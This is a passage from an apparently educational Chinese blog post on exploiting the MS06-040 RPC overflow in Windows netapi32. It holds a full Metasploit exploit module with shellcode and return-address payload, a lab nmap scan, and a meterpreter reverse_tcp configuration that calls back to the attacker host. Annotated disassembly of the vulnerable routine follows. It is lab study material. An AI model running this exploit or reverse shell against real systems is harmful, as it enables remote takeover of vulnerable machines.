class="string">&#x27;MS06-040 Remote overflow POC &#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Platform&#x27;</span>  =&gt; <span class="string">&#x27;win&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Targets&#x27;</span>   =&gt; [[<span class="string">&#x27;Windows 2000 SP0&#x27;</span>,</span><br><span class="line">                    &#123;<span class="string">&#x27;Ret&#x27;</span> =&gt; [<span class="number">0x318</span>, <span class="number">0x74FB62C3</span>]&#125;</span><br><span class="line">                    ]]</span><br><span class="line">        	))</span><br><span class="line">		register_options([OptString.new(</span><br><span class="line">							<span class="string">&#x27;SMBPIPE&#x27;</span>,</span><br><span class="line">                            [true,<span class="string">&quot;(BROWSER, SRVSVC)&quot;</span>, <span class="string">&#x27;BROWSER&#x27;</span>]</span><br><span class="line">                            ),],</span><br><span class="line">                       	self.<span class="keyword">class</span>)</span><br><span class="line">end <span class="comment">#end of initialize</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">exploit</span></span><br><span class="line">        connect()</span><br><span class="line">        smb_login()</span><br><span class="line">        handle = dcerpc_handle(<span class="string">&#x27;4b324fc8-1670-01d3-1278-5a47bf6ee188&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;3.0&#x27;</span>, <span class="string">&#x27;ncacn_np&#x27;</span>,  [<span class="string">&quot;\\#&#123;datastore[&#x27;SMBPIPE&#x27;]&#125;&quot;</span>])</span><br><span class="line">        dcerpc_bind(handle)</span><br><span class="line">        prefix = ......</span><br><span class="line">        path = ......</span><br><span class="line">        stub =NDR.long(rand(<span class="number">0xffffffff</span>)) +</span><br><span class="line">            NDR.UnicodeConformantVaryingString(<span class="string">&#x27;&#x27;</span>) +</span><br><span class="line">            NDR.UnicodeConformantVaryingStringPreBuilt(path) +</span><br><span class="line">            NDR.long(rand(<span class="number">0xf0</span>)+<span class="number">1</span>) +</span><br><span class="line">            NDR.UnicodeConformantVaryingStringPreBuilt(prefix) +</span><br><span class="line">            NDR.long(rand(<span class="number">0xf0</span>)+<span class="number">1</span>) +</span><br><span class="line">            NDR.long(<span class="number">0</span>)</span><br><span class="line">        dcerpc.call(<span class="number">0x1f</span>, stub) <span class="comment"># call NetpwPathCanonicalize()</span></span><br><span class="line">        disconnect</span><br><span class="line">        </span><br><span class="line">	end <span class="comment">#end of exploit def</span></span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>我们只需要关注 path 串和 prefix 串的内容，在恰当的位置布置特定的内容， MSF 和远程的主机会自动按照 RPC 协议为我们完成网络握手、参数解析、函数定位等工作。</p><p>攻击代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MetasploitModule</span> &lt; Msf::Exploit::Remote</span><br><span class="line">    Rank = GoodRanking</span><br><span class="line"> </span><br><span class="line">    include Msf::Exploit::Remote::DCERPC</span><br><span class="line">    include Msf::Exploit::Remote::SMB::Client                      <span class="comment"># 主要就是上面这几行，还有最后一行多了一个end</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">info = &#123;&#125;</span>)</span><br><span class="line">        <span class="built_in">super</span>(update_info(info,</span><br><span class="line">            <span class="string">&#x27;Name&#x27;</span>   =&gt; <span class="string">&#x27;MS06-040 Remote overflow POC &#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Platform&#x27;</span> =&gt; <span class="string">&#x27;win&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Targets&#x27;</span>  =&gt; [[<span class="string">&#x27;Windows 2000 SP0&#x27;</span>,</span><br><span class="line">                            &#123;<span class="string">&#x27;Ret&#x27;</span> =&gt; [<span class="number">0x318</span> , <span class="number">0x74FB62C3</span>]&#125;</span><br><span class="line">                           ]]</span><br><span class="line">             ))</span><br><span class="line">        register_options([OptString.new(</span><br><span class="line">                                <span class="string">&#x27;SMBPIPE&#x27;</span>,</span><br><span class="line">                                [true,<span class="string">&quot;(BROWSER, SRVSVC)&quot;</span>, <span class="string">&#x27;BROWSER&#x27;</span>]</span><br><span class="line">                                ),],</span><br><span class="line">                         self.<span class="keyword">class</span>) </span><br><span class="line">    end <span class="comment">#end of initialize</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">exploit</span></span><br><span class="line">        connect()</span><br><span class="line">        smb_login()</span><br><span class="line">        handle = dcerpc_handle(<span class="string">&#x27;4b324fc8-1670-01d3-1278-5a47bf6ee188&#x27;</span>,</span><br><span class="line">                              <span class="string">&#x27;3.0&#x27;</span>,  <span class="string">&#x27;ncacn_np&#x27;</span>,  [<span class="string">&quot;\\#&#123;datastore[&#x27;SMBPIPE&#x27;]&#125;&quot;</span>])</span><br><span class="line">        dcerpc_bind(handle)</span><br><span class="line">        prefix = <span class="string">&quot;\x8B\xC1\x83\xC0\x05\x59\x81\xC9\xD3\x62\x30\x20\x41\x43\x4D\x64&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\x99\x96\x8D\x7E\xE8\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B\x49\x1C\x8B&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\x09\x8B\x69\x08\xB6\x03\x2B\xE2\x66\xBA\x33\x32\x52\x68\x77\x73&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\x32\x5F\x54\xAC\x3C\xD3\x75\x06\x95\xFF\x57\xF4\x95\x57\x60\x8B&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59\x20\x03\xDD\x33\xFF\x47&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\x8B\x34\xBB\x03\xF5\x99\xAC\x34\x71\x2A\xD0\x3C\x71\x75\xF7\x3A&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\x54\x24\x1C\x75\xEA\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\x1C\x03\xDD\x03\x2C\xBB\x95\x5F\xAB\x57\x61\x3B\xF7\x75\xB4\x5E&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\x54\x6A\x02\xAD\xFF\xD0\x88\x46\x13\x8D\x48\x30\x8B\xFC\xF3\xAB&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\x40\x50\x40\x50\xAD\xFF\xD0\x95\xB8\x02\xFF\x1A\x0A\x32\xE4\x50&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\x54\x55\xAD\xFF\xD0\x85\xC0\x74\xF8\xFE\x44\x24\x2D\x83\xEF\x6C&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\xAB\xAB\xAB\x58\x54\x54\x50\x50\x50\x54\x50\x50\x56\x50\xFF\x56&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\xE4\xFF\x56\xE8\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x00\x00&quot;</span></span><br><span class="line">        path = <span class="string">&quot;\x90&quot;</span> * <span class="number">0x318</span> + [target[<span class="string">&#x27;Ret&#x27;</span>][<span class="number">1</span>]].pack(<span class="string">&#x27;V&#x27;</span>) + </span><br><span class="line">            <span class="string">&quot;\x04\xD0\xFD\x7F&quot;</span> * <span class="number">5</span> +    <span class="comment"># writeable address</span></span><br><span class="line">            <span class="string">&quot;\x66\x81\xEC\x30\x04&quot;</span> +    <span class="comment"># sub esp,430</span></span><br><span class="line">            <span class="string">&quot;\x8B\xC4&quot;</span> +             <span class="comment"># mov eax, esp</span></span><br><span class="line">            <span class="string">&quot;\xFF\xE4&quot;</span> +            <span class="comment"># jmp esp</span></span><br><span class="line">            <span class="string">&quot;\x00\x00&quot;</span></span><br><span class="line">        stub =NDR.long(rand(<span class="number">0xffffffff</span>)) +</span><br><span class="line">             NDR.UnicodeConformantVaryingString(<span class="string">&#x27;&#x27;</span>) +</span><br><span class="line">             NDR.UnicodeConformantVaryingStringPreBuilt(path) +</span><br><span class="line">             NDR.long(rand(<span class="number">0xf0</span>)+<span class="number">1</span>) +</span><br><span class="line">             NDR.UnicodeConformantVaryingStringPreBuilt(prefix) +</span><br><span class="line">             NDR.long(rand(<span class="number">0xf0</span>)+<span class="number">1</span>) +</span><br><span class="line">             NDR.long(<span class="number">0</span>)    </span><br><span class="line">        dcerpc.call(<span class="number">0x1f</span>, stub) <span class="comment"># call NetpwPathCanonicalize()</span></span><br><span class="line">        disconnect    </span><br><span class="line">    end  <span class="comment">#end of exploit def</span></span><br><span class="line">end</span><br></pre></td></tr></table></figure><h3 id="配置"><a class="markdownIt-Anchor" href="#配置"></a> 配置</h3><p>攻击机：kali</p><p>IP地址：192.168.188.141</p><p>靶机：Windows2000 sp4</p><p>IP地址：192.168.188.133</p><h3 id="准备"><a class="markdownIt-Anchor" href="#准备"></a> 准备</h3><p>首先确定靶机开启的端口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">┌──(host㉿kali)-[~]</span><br><span class="line">└─$ sudo nmap --allports -O 192.168.188.133                                                                               </span><br><span class="line">[sudo] host 的密码：</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-15 21:22 CST</span><br><span class="line">Nmap scan report for 192.168.188.133</span><br><span class="line">Host is up (0.00030s latency).</span><br><span class="line">Not shown: 995 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">135/tcp  open  msrpc</span><br><span class="line">139/tcp  open  netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds</span><br><span class="line">1025/tcp open  NFS-or-IIS</span><br><span class="line">1723/tcp open  pptp</span><br><span class="line">MAC Address: 00:0C:29:97:7A:5F (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Microsoft Windows 2000|XP</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_2000::- cpe:/o:microsoft:windows_2000::sp1 cpe:/o:microsoft:windows_2000::sp2 cpe:/o:microsoft:windows_2000::sp3 cpe:/o:microsoft:windows_2000::sp4 cpe:/o:microsoft:windows_xp::- cpe:/o:microsoft:windows_xp::sp1</span><br><span class="line">OS details: Microsoft Windows 2000 SP0 - SP4 or Windows XP SP0 - SP1</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 3.64 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到打开了445端口。</p><p>最后的配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(rgzz/ms06_040) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/rgzz/ms06_040):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   RHOSTS   192.168.188.133  yes       The target host(s), see https://gith</span><br><span class="line">                                       ub.com/rapid7/metasploit-framework/w</span><br><span class="line">                                       iki/Using-Metasploit</span><br><span class="line">   RPORT    445              yes       The SMB service port (TCP)</span><br><span class="line">   SMBPIPE  BROWSER          yes       (BROWSER, SRVSVC)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh,</span><br><span class="line">                                        thread, process, none)</span><br><span class="line">   LHOST     192.168.188.141  yes       The listen address (an interface ma</span><br><span class="line">                                        y be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows 2000 SP0</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用上面给出的代码，结果出错了，导致了靶机关机。</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220716170814837.png" alt="image-20220716170814837"></p><h3 id="调试-serviceexe"><a class="markdownIt-Anchor" href="#调试-serviceexe"></a> 调试 service.exe</h3><p>将OD附加到services上，然后在<code>NetpwPathCanonicalize</code>（0x75107AFD）上下一个断点，F9继续执行。</p><p style="color:red">回到攻击机上，执行exploit，再回到靶机，发现并没有在 NetpwPathCanonicalize 停下，而是直接提示关机，这样就无法进行后续调试了。不知道是不是漏洞已经被修补的缘故。上面的本地实验中，我用的也是本书资料中提供的netapi32.dll。</p><h1 id="windows-xp-环境下的-ms06040-exploit"><a class="markdownIt-Anchor" href="#windows-xp-环境下的-ms06040-exploit"></a> Windows XP 环境下的 MS06—040 exploit</h1><h2 id="静态分析-2"><a class="markdownIt-Anchor" href="#静态分析-2"></a> 静态分析</h2><p>选取 Windows XP SP3 的 netapi32.dll，对其 CanonicalizePathName 函数做静态分析。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">; =============== S U B R O U T I N E =======================================</span><br><span class="line">; int __stdcall CanonicalizePathName(wchar_t*, wchar_t *, wchar_t *, int, int)</span><br><span class="line">71BA428B CanonicalizePathName proc near</span><br><span class="line">71BA428B</span><br><span class="line">71BA428B Buff_last_word = word ptr -416h</span><br><span class="line">71BA428B Buff_OF = word ptr -414h</span><br><span class="line">71BA428B arg_Prefix = dword ptr 8</span><br><span class="line">71BA428B arg_Path = dword ptr 0Ch</span><br><span class="line">71BA428B arg_CanPath = dword ptr 10h</span><br><span class="line">71BA428B arg_Maxbuf = dword ptr 14h</span><br><span class="line">71BA428B arg_CanSize = dword ptr 18h</span><br><span class="line">71BA428B</span><br><span class="line">71BA428B push ebp</span><br><span class="line">71BA428C mov ebp, esp</span><br><span class="line">71BA428E sub esp, 414h 				; 依然分配了 0x414 字节栈空间，即 Buff_OF，</span><br><span class="line">									; 用来存储合并路径(prefix+’\’+path)</span><br><span class="line">71BA4294 push ebx</span><br><span class="line">71BA4295 mov ebx, ds:__imp_wcscat</span><br><span class="line">71BA429B push esi</span><br><span class="line">71BA429C xor esi, esi</span><br><span class="line">71BA429E cmp [ebp+arg_Prefix], esi 	; prefix 指针是否为 0</span><br><span class="line">71BA42A1 push edi</span><br><span class="line">71BA42A2 mov edi, ds:__imp_wcslen</span><br><span class="line">71BA42A8 jnz @@prefix_ptr_not_zero</span><br><span class="line">									; 若 prefix 非 0，跳转至@@prefix_ptr_not_zero</span><br><span class="line">71BA42AE mov [ebp+Buff_OF], si 		; 若 prefix 为 0，初始化 Buff_OF 为空串</span><br><span class="line">71BA42B5 @@chk_pathname:</span><br><span class="line">71BA42B5 push [ebp+arg_Path]</span><br><span class="line">71BA42B8 call edi 					; __imp_wcslen ; 计算 path 串的 Unicode 长度</span><br><span class="line">71BA42BA add eax, esi				; 计算合并路径长度</span><br><span class="line">71BA42BC cmp eax, 207h 				; 对合并路径长度做越界检查，请注意，这里已经将</span><br><span class="line">                        			; 字节长度除 2，转化为 unicode 长度 0x207，而</span><br><span class="line">                        			; 在 Windows 2000 中，这个值是 0x411,没有做</span><br><span class="line">                        			; 转化，可见 Windows XP 的溢出另有原因！</span><br><span class="line">71BA42C1 pop ecx</span><br><span class="line">71BA42C2 ja @@err_invalid_name</span><br><span class="line">71BA42C8 push [ebp+arg_Path]</span><br><span class="line">71BA42CB lea eax, [ebp+Buff_OF]</span><br><span class="line">71BA42D1 push eax</span><br><span class="line">71BA42D2 call ebx ; __imp_wcscat 	; 将 Buff_OF(prefix+’\’)与 path 串合并</span><br><span class="line">									; 得到合并路径</span><br><span class="line">…</span><br><span class="line">71BA4317 lea eax, [ebp+Buff_OF]</span><br><span class="line">71BA431D push eax</span><br><span class="line">71BA431E call edi 					; __imp_wcslen ; 计算合并路径 Unicode 长度</span><br><span class="line">71BA4320 lea eax, [eax+eax+2] 		; 将 Unicode 长度转化为字节长度并加上结尾</span><br><span class="line">									; 的两个空字节</span><br><span class="line">71BA4324 cmp eax, [ebp+arg_Maxbuf] 	; 检查 can_path 的容量 maxbuf，是否可以</span><br><span class="line">									; 可以容纳合并路径</span><br><span class="line">71BA4327 pop ecx</span><br><span class="line">71BA4328 ja @@err_buf_too_small 	; 若 can_path 空间不够，退出</span><br><span class="line">71BA432E lea eax, [ebp+Buff_OF]</span><br><span class="line">71BA4334 push eax</span><br><span class="line">71BA4335 push [ebp+arg_CanPath]</span><br><span class="line">71BA4338 call ds:__imp_wcscpy		; 将合并路径复制 Buff_OF 至 can_path</span><br><span class="line">71BA433E pop ecx</span><br><span class="line">71BA433F pop ecx</span><br><span class="line">71BA4340 xor eax, eax 				; 路径合并成功，返回 0</span><br><span class="line">71BA4342 @@quit:</span><br><span class="line">71BA4342 pop edi</span><br><span class="line">71BA4343 pop esi</span><br><span class="line">71BA4344 pop ebx</span><br><span class="line">71BA4345 leave</span><br><span class="line">71BA4346 retn 14h</span><br><span class="line">71BA4349 @@err_invalid_name:</span><br><span class="line">71BA4349 push ERROR_INVALID_NAME</span><br><span class="line">71BA434B pop eax</span><br><span class="line">71BA434C jmp short @@quit</span><br><span class="line">71BA434C CanonicalizePathName endp</span><br><span class="line">…</span><br><span class="line">71BB0E2D @@prefix_ptr_not_zero:</span><br><span class="line">71BB0E2D push [ebp+arg_Prefix]</span><br><span class="line">71BB0E30 call edi 					; __imp_wcslen</span><br><span class="line">71BB0E32 mov esi, eax 				; esi 存储 prefix 串的 unicode 长度</span><br><span class="line">71BB0E34 test esi, esi 				; 检查 prefix 串长度是否为 0，即空串</span><br><span class="line">71BB0E36 pop ecx</span><br><span class="line">71BB0E37 jz @@chk_pathname 			; 如果 prefix 为空串，则跳至</span><br><span class="line">                                    ; @@chk_pathname，请注意，如果代码</span><br><span class="line">                                    ; 流程走到这里， Buff_OF 始终是没有初</span><br><span class="line">                                    ; 始化的！这是 MS06-040 的另一个溢出点</span><br><span class="line">71BB0E3D cmp esi, 208h 				; 如果 prefix 串非空，其 Unicode 长度</span><br><span class="line">									; 不能超过 0x208，否则退出</span><br><span class="line">71BB0E43 ja @@err_invalid_name</span><br><span class="line">…</span><br><span class="line">71BB0EA9 @@err_buf_too_small:</span><br><span class="line">71BB0EA9 mov ecx, [ebp+arg_CanSize]</span><br><span class="line">71BB0EAC test ecx, ecx</span><br><span class="line">71BB0EAE jz short @@err_buf_too_small2</span><br><span class="line">71BB0EB0 mov [ecx], eax</span><br><span class="line">71BB0EB2 @@err_buf_too_small2:</span><br><span class="line">71BB0EB2 mov eax, NERR_BufTooSmall</span><br><span class="line">71BB0EB7 jmp @@quit</span><br><span class="line">…</span><br><span class="line">; =============== S U B R O U T I N E =======================================</span><br></pre></td></tr></table></figure><p>从上面的第 31 行中可以看到，上一个实验中 cmp eax,411 已经被修补，无法在利用。不过，通过进一步静态分析，可以发现 CanonicalizePathName 函数在分配了栈空间 Buff_OF 后，没有进行初始化；如果 prefix 指针为 0，代码会对 Buff_OF 做初始化（见 0x71BA42AE）；而如果 prefix 非 0，并指向空字串，代码将直接对未初始化的 Buff_OF 和 path 串用 wcscat 函数进行连接（见 0x71BA42B5-0x71BA42D2）。这是一个非常危险的操作，因为未初始化的栈空间 Buff_OF 的长度是未知的，甚至可能超过 0x414 字节，其后再连接上 path 串，很有可能产生溢出。</p><p>由于 Buff_OF 位于栈中，内容随机，怎样控制它的长度，是如何利用这个漏洞的重点。我们可以通过连续调用 CanonicalizePathName 函数来控制它的长度。 因为当 Buff_OF 被首次填充并连接，直到 CanonicalizePathName 函数退出后，其所在的栈空间位于 ESP 的低地址，如果不做任何栈操作，如函数调用等，内容是不会改变的；此时，如果再次调用 CanonicalizePathName，已经被填充的 Buff_OF 将面临溢出的风险。</p><p>CanonicalizePathName 是 NetpwPathCanonicalize 的子函数，不能直接被调用。分析一下函数 NetpwPathCanonicalize 是如何调用 CanonicalizePathName 的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">71BA421A mov esi, [ebp+arg_CanPath]</span><br><span class="line">71BA421D push edi</span><br><span class="line">71BA421E push [ebp+arg_Maxbuf]</span><br><span class="line">71BA4221 mov [esi], di</span><br><span class="line">71BA4224 push esi</span><br><span class="line">71BA4225 push [ebp+arg_Path]</span><br><span class="line">71BA4228 push ebx</span><br><span class="line">71BA4229 call CanonicalizePathName</span><br><span class="line">71BA422E cmp eax, edi 					; 检查函数 CanonicalizePathName 的返回值</span><br><span class="line">71BA4230 jnz short @@quit 				; 非 0 则直接退出</span><br><span class="line">71BA4232 push edi</span><br><span class="line">71BA4233 push [ebp+arg_Pathtype]</span><br><span class="line">71BA4236 push esi</span><br><span class="line">71BA4237 call NetpwPathType</span><br><span class="line">71BA423C jmp short @@quit</span><br><span class="line">...</span><br><span class="line">; =============== S U B R O U T I N E =======================================</span><br><span class="line">; int __stdcall NetpwPathCanonicalize(wchar_t *, wchar_t *, int, int, int, int)</span><br><span class="line">71BA4244 public NetpwPathCanonicalize</span><br><span class="line">71BA4244 NetpwPathCanonicalize proc near</span><br><span class="line">71BA4244</span><br><span class="line">71BA4244 arg_Path = dword ptr 8</span><br><span class="line">71BA4244 arg_CanPath = dword ptr 0Ch</span><br><span class="line">71BA4244 arg_Maxbuf = dword ptr 10h</span><br><span class="line">71BA4244 arg_Prefix = dword ptr 14h</span><br><span class="line">71BA4244 arg_Pathtype = dword ptr 18h</span><br><span class="line">71BA4244 arg_Pathflags = dword ptr 1Ch</span><br><span class="line">...</span><br><span class="line">71BA4284 @@quit</span><br><span class="line">71BA4284 pop edi</span><br><span class="line">71BA4285 pop esi</span><br><span class="line">71BA4286 pop ebx</span><br><span class="line">71BA4287 pop ebp</span><br><span class="line">71BA4288 retn 18h</span><br><span class="line">71BA4288 NetpwPathCanonicalize endp</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>如果能够使 CanonicalizePathName 调用失败（返回值非 0），NetpwPathCanonicalize 将直接退出，从而保证 Buff_OF 所在的栈空间不发生变化。由于参数 maxbuf 是可控的，我们可 以 利 用 较 小 的 maxbuf ， 使 CanonicalizePathName 返 回 NERR_BufTooSmall （参看 0x71BA4317-0x71BA4328）而直接退出。</p><p>MS06-040 在 Windows XP 下溢出的 POC 代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(__stdcall * MYPROC)</span><span class="params">(LPTSTR, LPTSTR, <span class="type">int</span>, LPTSTR, <span class="type">long</span> *, <span class="type">long</span>)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PATH1_SIZE (0xc2*2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PATH2_SIZE 